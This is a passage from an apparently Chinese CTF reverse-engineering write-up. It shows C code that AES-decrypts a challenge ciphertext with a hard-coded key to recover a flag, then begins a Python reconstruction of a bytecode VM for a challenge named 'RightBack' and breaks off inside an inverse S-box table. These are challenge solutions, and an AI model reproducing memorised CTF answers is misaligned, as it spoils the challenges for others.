</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>aes_decrypt</span><span class=p>(</span><span class=n>AES_CYPHER_128</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>aes_cypher_192_test</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>buf</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x88</span><span class=p>,</span> <span class=mh>0x99</span><span class=p>,</span> <span class=mh>0xaa</span><span class=p>,</span> <span class=mh>0xbb</span><span class=p>,</span> <span class=mh>0xcc</span><span class=p>,</span> <span class=mh>0xdd</span><span class=p>,</span> <span class=mh>0xee</span><span class=p>,</span> <span class=mh>0xff</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>key</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x0b</span><span class=p>,</span> <span class=mh>0x0c</span><span class=p>,</span> <span class=mh>0x0d</span><span class=p>,</span> <span class=mh>0x0e</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x17</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>aes_encrypt</span><span class=p>(</span><span class=n>AES_CYPHER_192</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>aes_decrypt</span><span class=p>(</span><span class=n>AES_CYPHER_192</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>aes_cypher_256_test</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>buf</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x88</span><span class=p>,</span> <span class=mh>0x99</span><span class=p>,</span> <span class=mh>0xaa</span><span class=p>,</span> <span class=mh>0xbb</span><span class=p>,</span> <span class=mh>0xcc</span><span class=p>,</span> <span class=mh>0xdd</span><span class=p>,</span> <span class=mh>0xee</span><span class=p>,</span> <span class=mh>0xff</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>key</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x0b</span><span class=p>,</span> <span class=mh>0x0c</span><span class=p>,</span> <span class=mh>0x0d</span><span class=p>,</span> <span class=mh>0x0e</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x18</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x1a</span><span class=p>,</span> <span class=mh>0x1b</span><span class=p>,</span> <span class=mh>0x1c</span><span class=p>,</span> <span class=mh>0x1d</span><span class=p>,</span> <span class=mh>0x1e</span><span class=p>,</span> <span class=mh>0x1f</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>aes_encrypt</span><span class=p>(</span><span class=n>AES_CYPHER_256</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>aes_decrypt</span><span class=p>(</span><span class=n>AES_CYPHER_256</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>//</span><span class=n>数据</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>buf</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x2b</span><span class=p>,</span><span class=mh>0xc8</span><span class=p>,</span><span class=mh>0x20</span><span class=p>,</span><span class=mh>0x8b</span><span class=p>,</span><span class=mh>0x5c</span><span class=p>,</span><span class=mh>0x0d</span><span class=p>,</span><span class=mh>0xa7</span><span class=p>,</span><span class=mh>0x9b</span><span class=p>,</span><span class=mh>0x2a</span><span class=p>,</span><span class=mh>0x51</span><span class=p>,</span><span class=mh>0x3a</span><span class=p>,</span><span class=mh>0xd2</span><span class=p>,</span><span class=mh>0x71</span><span class=p>,</span><span class=mh>0x71</span><span class=p>,</span><span class=mh>0xca</span><span class=p>,</span><span class=mh>0x50</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=o>//</span><span class=n>密钥</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>key</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x52</span><span class=p>,</span><span class=mh>0x65</span><span class=p>,</span><span class=mh>0x5f</span><span class=p>,</span><span class=mh>0x31</span><span class=p>,</span><span class=mh>0x73</span><span class=p>,</span><span class=mh>0x5f</span><span class=p>,</span><span class=mh>0x65</span><span class=p>,</span><span class=mh>0x61</span><span class=p>,</span><span class=mh>0x53</span><span class=p>,</span><span class=mh>0x79</span><span class=p>,</span><span class=mh>0x31</span><span class=p>,</span><span class=mh>0x32</span><span class=p>,</span><span class=mh>0x33</span><span class=p>,</span><span class=mh>0x34</span><span class=p>,</span><span class=mh>0x35</span><span class=p>,</span><span class=mh>0x36</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=o>//</span><span class=n>uint8_t</span> <span class=n>key</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x52</span><span class=p>,</span><span class=mh>0x65</span><span class=p>,</span><span class=mh>0x5f</span><span class=p>,</span><span class=mh>0x31</span><span class=p>,</span><span class=mh>0x73</span><span class=p>,</span><span class=mh>0x5f</span><span class=p>,</span><span class=mh>0x65</span><span class=p>,</span><span class=mh>0x61</span><span class=p>,</span><span class=mh>0x53</span><span class=p>,</span><span class=mh>0x79</span><span class=p>,</span><span class=mh>0x31</span><span class=p>,</span><span class=mh>0x32</span><span class=p>,</span><span class=mh>0x33</span><span class=p>,</span><span class=mh>0x34</span><span class=p>,</span><span class=mh>0x35</span><span class=p>,</span><span class=mh>0x36</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=o>//</span><span class=n>向量</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>iv</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>switch</span> <span class=p>(</span><span class=n>sizeof</span><span class=p>(</span><span class=n>key</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>//</span><span class=n>ECB</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mi>16</span><span class=p>:</span><span class=n>aes_decrypt</span><span class=p>(</span><span class=n>AES_CYPHER_128</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mi>24</span><span class=p>:</span><span class=n>aes_decrypt</span><span class=p>(</span><span class=n>AES_CYPHER_192</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mi>32</span><span class=p>:</span><span class=n>aes_decrypt</span><span class=p>(</span><span class=n>AES_CYPHER_256</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>//</span><span class=n>CBC</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mi>16</span><span class=p>:</span><span class=n>aes_decrypt_cbc</span><span class=p>(</span><span class=n>AES_CYPHER_128</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mi>24</span><span class=p>:</span><span class=n>aes_decrypt_cbc</span><span class=p>(</span><span class=n>AES_CYPHER_192</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mi>32</span><span class=p>:</span><span class=n>aes_decrypt_cbc</span><span class=p>(</span><span class=n>AES_CYPHER_256</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>拼一块就是flag</p><h2 id=rightback>RightBack</h2><p>很恶心的字节码很长，大致逻辑是这样的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>T</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>p3</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>F1</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=n>F2</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>6</span>
</span></span><span class=line><span class=cl><span class=n>F3</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl><span class=n>F4</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>F5</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>9</span>
</span></span><span class=line><span class=cl><span class=n>F6</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=n>F7</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>11</span>
</span></span><span class=line><span class=cl><span class=n>F8</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>12</span>
</span></span><span class=line><span class=cl><span class=n>F9</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>13</span>
</span></span><span class=line><span class=cl><span class=n>FA</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>14</span>
</span></span><span class=line><span class=cl><span class=n>FB</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>15</span>
</span></span><span class=line><span class=cl><span class=n>WC</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl><span class=n>VM</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>17</span>
</span></span><span class=line><span class=cl><span class=n>Have</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>18</span>
</span></span><span class=line><span class=cl><span class=n>Fun</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=mi>19</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=n>EIP</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_table</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;EAX&#39;</span><span class=p>:</span> <span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=s1>&#39;2&#39;</span><span class=p>,</span> <span class=s1>&#39;3&#39;</span><span class=p>,</span> <span class=s1>&#39;4&#39;</span><span class=p>,</span> <span class=s1>&#39;5&#39;</span><span class=p>,</span> <span class=s1>&#39;6&#39;</span><span class=p>,</span> <span class=s1>&#39;7&#39;</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>    <span class=n>Sbox</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=mi>82</span><span class=p>,</span> <span class=mi>9</span><span class=p>,</span> <span class=mi>106</span><span class=p>,</span> <span class=mi>213</span><span class=p>,</span> <span class=mi>48</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>165</span><span class=p>,</span> <span class=mi>56</span><span class=p>,</span> <span class=mi>191</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=mi>163</span><span class=p>,</span> <span class=mi>158</span><span class=p>,</span> <span class=mi>129</span><span class=p>,</span> <span class=mi>243</span><span class=p>,</span> <span class=mi>215</span><span class=p>,</span> <span class=mi>251</span><span class=p>,</span> <span class=mi>124</span><span class=p>,</span> <span class=mi>227</span><span class=p>,</span> <span class=mi>57</span><span class=p>,</span> <span class=mi>130</span><span class=p>,</span> <span class=mi>155</span><span class=p>,</span> <span class=mi>47</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>135</span><span class=p>,</span> <span class=mi>52</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>67</span><span class=p>,</span> <span class=mi>68</span><span class=p>,</span> <span class=mi>196</span><span class=p>,</span> <span class=mi>222</span><span class=p>,</span> <span class=mi>233</span><span class=p>,</span> <span class=mi>203</span><span class=p>,</span> <span class=mi>84</span><span class=p>,</span> <span class=mi>123</span><span class=p>,</span> <span class=mi>148</span><span class=p>,</span> <span class=mi>50</span><span class=p>,</span> <span class=mi>166</span><span class=p>,</span> <span class=mi>194</span><span class=p>,</span> <span class=mi>35</span><span class=p>,</span> <span class=mi>61</span><span class=p>,</span> <span class=mi>238</span><span class=p>,</span> <span class=mi>76</span><span class=p>,</span> <span class=mi>149</span><span class=p>,</span> <span class=mi>11</span><span class=p>,</span> <span class=mi>66</span><span class=p>,</span> <span class=mi>250</span><span class=p>,</span> <span class=mi>195</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>46</span><span class=p>,</span> <span class=mi>161</span><span class=p>,</span> <span class=mi>102</span><span class=p>,</span> <span class=mi>40</span><span class=p>,</span> <span class=mi>217</span><span class=p>,</span> <span class=mi>36</span><span class=p>,</span> <span class=mi>178</span><span class=p>,</span> <span class=mi>118</span><span class=p>,</span> <span class=mi>91</span><span class=p>,</span> <span class=mi>162</span><span class=p>,</span> <span class=mi>73</span><span class=p>,</span> <span class=mi>109</span><span class=p>,</span> <span class=mi>139</span><span class=p>,</span> <span class=mi>209</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>114</span><span class=p>,</span> <span class=mi>248</span><span class=p>,</span> <span class=mi>246</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=mi>134</span><span class=p>,</span> <span class=mi>104</span><span class=p>,</span> <span class=mi>152</span><span class=p>,</span> <span class=mi>22</span><span class=p>,</span> <span class=mi>212</span><span class=p>,</span> <span class=mi>164</span><span class=p>,</span> <span class=mi>92</span><span class=p>,</span> <span class=mi>204</span><span class=p>,</span> <span class=mi>93</span><span class=p>,</span> <span class=mi>101</span><span class=p>,</span> <span class=mi>182</span><span class=p>,</span> <span class=mi>146</span><span class=p>,</span> <span class=mi>108</span><span class=p>,</span> <span class=mi>112</span><span class=p>,</span> <span class=mi>72</span><span class=p>,</span> <span class=mi>80</span><span class=p>,</span> <span class=mi>253</span><span class=p>,</span> <span class=mi>237</span><span class=p>,</span> <span class=mi>185</span><span class=p>,</span> <span class=mi>218</span><span class=p>,</span> <span class=mi>94</span><span class=p>,</span> <span class=mi>21</span><span class=p>,</span> <span class=mi>70</span><span class=p>,</span> <span class=mi>87</span><span class=p>,</span> <span class=mi>167</span><span class=p>,</span> <span class=mi>141</span><span class=p>,</span> <span class=mi>157</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span class=mi>144</span><span class=p>,</span> <span class=mi>216</span><span class=p>,</span> <span class=mi>171</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>140</span><span class=p>,</span> <span class=mi>188</span><span class=p>,</span> <span class=mi>211</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>247</span><span class=p>,</span> <span class=mi>228</span><span class=p>,</span> <span class=mi>88</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>184</span><span class=p>,</span> <span class=mi>179</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>208</span><span class=p>,</span> <span class=mi>44</span><span class=p>,</span> <span class=mi>30</span><span class=p>,</span> <span class=mi>143</span><span class=p>,</span> <span class=mi>202</span><span class=p>,</span> <span class=mi>63</span><span class=p>,</span> <span class=mi>15</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>193</span><span class=p>,</span> <span class=mi>175</span><span class=p>,</span> <span class=mi>189</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>19</span><span class=p>,</span> <span class=mi>138</span><span class=p>,</span> <span class=mi>107</span><span class=p>,</span> <span class=mi>58</span><span class=p>,</span> <span class=mi>145</span><span class=p>,</span> <span class=mi>17</span><span class=p>,</span> <span class=mi>65</span><span class=p>,</span> <span class=mi>79</span><span class=p>,</span> <span class=mi>103</span><span class=p>,</span> <span class=mi>220</span><span class=p>,</span> <span class=mi>234</span><span class=p>,</span> <span class=mi>151</span><span class=p>,</span> <span class=mi>242</span><span class=p>,</span> <span class=mi>207</span><span class=p>,</span> <span class=mi>206</span><span class=p>,</span> <span class=mi>240</span><span class=p>,</span> <span class=mi>180</span><span class=p>,</span> <span class=mi>230</span><span class=p>,</span> <span class=mi>115</span><span class=p>,</span> <span class=mi>150</span><span class=p>,</span> <span class=mi>172</span><span class=p>,</span> <span class=mi>116</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=mi>231</span><span class=p>,</span> <span class=mi>173</span><span class=p>,</span> <span class=mi>53</span><span class=p>,</span> <span class=mi>133</span><span class=p>,</span> <span class=mi>226</span><span class=p>,</span> <span class=mi>249</span><span class=p>,</span> <span class=mi>55</span><span class=p>,</span> <span class=mi>232</span><span class=p>,</span> <span class=mi>28</span><span class=p>,</span> <span class=mi>117</span><span class=p>,</span> <span class=mi>223</span><span class=p>,</span> <span class=mi>110</span><span class=p>,</span> <span class=mi>71</span><span class=p>,</span> <span class=mi>241</span><span class=p>,</span> <span class=mi>26</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>29</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=mi>197</span><span class=p>,</span> <span class=mi>137</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>183</span><span class=p>,</span> <span class=mi>98</span><span class=p>,</span> <span class=mi>14</span><span class=p>,</span> <span class=mi>170</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=mi>190</span><span class=p>,</span> <span class=mi>27</span><span class=p>,</span> <span class=mi>252</span><span class=p>,</span> <span class=mi>86</span><span class=p>,</span> <span class=mi>62</span><span class=p>,</span> <span class=mi>75</span><span class=p>,</span> <span class=mi>198</span><span class=p>,</span> <span class=mi>210</span><span class=p>,</span> <span class=mi>121</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=mi>154</span><span class=p>,</span> <span class=mi>219</span><span class=p>,</span> <span class=mi>192</span><span class=p>,</span> <span class=mi>254</span><span class=p>,</span> <span class=mi>120</span><span class=p>,</span> <span class=mi>205</span><span class=p>,</span> <span class=mi>90</span><span class=p>,</span> <span class=mi>244</span><span class=p>,</span> <span class=mi>31</span><span class=p>,</span> <span class=mi>221</span><span class=p>,</span> <span class=mi>168</span><span class=p>,</span> <span class=mi>51</span><span class=p>,</span> <span class=mi>136</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>199</span><span class=p>,</span> <span class=mi>49</span><span class=p>,</span> <span class=mi>177</span><span class=p>,</span> <span class=mi>18</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>89</span><span class=p>,</span> <span class=mi>39</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>236</span><span class=p>,</span> <span class=mi>95</span><span class=p>,</span> <span class=mi>96</span><span class=p>,</span> <span class=mi>81</span><span class=p>,</span> <span class=mi>127</span><span class=p>,</span> <span class=mi>169</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=mi>181</span><span class=p>,</span> <span class=mi>74</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>45</span><span class=p>,</span> <span class=mi>229</span><span class=p>,</span> <span class=mi>122</span><span class=p>,</span> <span class=mi>159</span><span class=p>,</span> <span class=mi>147</span><span class=p>,</span> <span class=mi>201</span><span class=p>,</span> <span class=mi>156</span><span class=p>,</span> <span class=mi>239</span><span class=p>,</span> <span class=mi>160</span><span class=p>,</span> <span class=mi>224</span><span class=p>,</span> <span class=mi>59</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>174</span><span class=p>,</span> <span class=mi>42</span><span class=p>,</span> <span class=mi>245</span><span class=p>,</span> <span class=mi>176</span><span class=p>,</span> <span class=mi>200</span><span class=p>,</span> <span class=mi>235</span><span class=p>,</span> <span 